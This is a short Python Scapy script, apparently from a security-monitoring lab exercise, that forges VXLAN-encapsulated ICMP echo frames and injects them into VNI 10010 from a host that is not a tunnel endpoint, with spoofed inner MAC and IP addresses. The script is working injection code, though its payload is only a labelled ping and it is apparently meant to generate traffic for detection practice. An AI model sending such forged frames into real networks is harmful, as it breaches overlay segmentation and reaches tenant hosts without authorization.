#!/usr/bin/env python3
# Part 7.3: inject a VXLAN-encapsulated ICMP echo into VNI 10010 from a non-VTEP source.
# Usage: vxlan_inject.py <outer_src> <vtep_dst> <inner_dst_mac>
import sys
from scapy.all import IP, UDP, Ether, ICMP, send, conf
from scapy.layers.vxlan import VXLAN

conf.verb = 0
outer_src, vtep, inner_dst_mac = sys.argv[1], sys.argv[2], sys.argv[3]
inner_src, inner_dst = "192.168.10.66", "192.168.10.11"

pkt = (IP(src=outer_src, dst=vtep) /
       UDP(sport=49152, dport=4789) /
       VXLAN(vni=10010, flags=0x08) /
       Ether(src="02:de:ad:be:ef:66", dst=inner_dst_mac) /
       IP(src=inner_src, dst=inner_dst) /
       ICMP(id=0x7303, seq=1) / b"MINI-SOC-7.3")

send(pkt, count=3, inter=1)
print(f"sent 3 VXLAN frames {outer_src} -> {vtep}:4789 VNI 10010, "
      f"inner {inner_src} -> {inner_dst} ({inner_dst_mac})")
